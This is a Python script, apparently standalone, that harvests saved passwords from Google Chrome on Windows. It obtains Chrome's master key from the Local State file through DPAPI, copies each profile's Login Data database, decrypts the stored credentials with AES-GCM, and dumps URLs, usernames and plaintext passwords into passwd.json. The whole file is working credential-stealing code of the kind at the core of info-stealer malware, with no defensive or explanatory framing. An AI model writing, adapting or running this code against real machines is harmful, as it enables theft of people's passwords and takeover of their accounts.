import os
import json
import base64
import win32crypt
import sqlite3
import shutil
from Cryptodome.Cipher import AES

def get_encryption_key():
    local_state_path = os.getenv("LOCALAPPDATA") + r"\Google\Chrome\User Data\Local State"
    try:
        with open(local_state_path, "r", encoding="utf-8") as file:
            local_state = json.load(file)
        encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
        decrypted_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
        return decrypted_key
    except Exception as e:
        print(f"Error obtaining encryption key: {e}")
        return None

def decrypt_password(encrypted_password, key):
    if not key:
        return "No key available"
    try:
        nonce, ciphertext, tag = encrypted_password[:12], encrypted_password[12:-16], encrypted_password[-16:]
        cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
        return cipher.decrypt_and_verify(ciphertext, tag).decode("utf-8", errors="ignore")
    except Exception as e:
        return f"Failed to decrypt: {e}"

def get_chrome_passwords():
    base_path = os.getenv("LOCALAPPDATA") + r"\Google\Chrome\User Data"
    profiles = ["Default"] + [dir_name for dir_name in os.listdir(base_path) if dir_name.startswith("Profile")]
    key = get_encryption_key()
    passwd_list = {}
    
    for profile in profiles:
        original_db_path = os.path.join(base_path, profile, "Login Data")
        
        if os.path.exists(original_db_path):
            temp_db_path = os.getenv("LOCALAPPDATA") + r"\Temp\Login Data"
            shutil.copyfile(original_db_path, temp_db_path)
            
            try:
                conn = sqlite3.connect(temp_db_path)
                cursor = conn.cursor()
                cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
                
                for url, username, encrypted_password in cursor.fetchall():
                    try:
                        if encrypted_password[:3] == b'v10' or encrypted_password[:3] == b'v20':
                            decrypted_password = decrypt_password(encrypted_password[3:], key)
                        else:
                            decrypted_password = win32crypt.CryptUnprotectData(encrypted_password, None, None, None, 0)[1].decode("utf-8", errors="ignore")
                    except Exception as e:
                        decrypted_password = f"Failed to decrypt: {e}"
                    
                    passwd_list[url] = {"Profile": profile, "Username": username, "Password": decrypted_password}
            except Exception as e:
                print(f"Error reading database in {profile}: {e}")
            finally:
                conn.close()
                os.remove(temp_db_path)
        else:
            print(f"Login Data not found in {original_db_path}")
    
    file_name = "passwd.json"
    with open(file_name, "w", encoding="utf-8") as file:
        json.dump(passwd_list, file, indent=4, ensure_ascii=False)
    
    return file_name
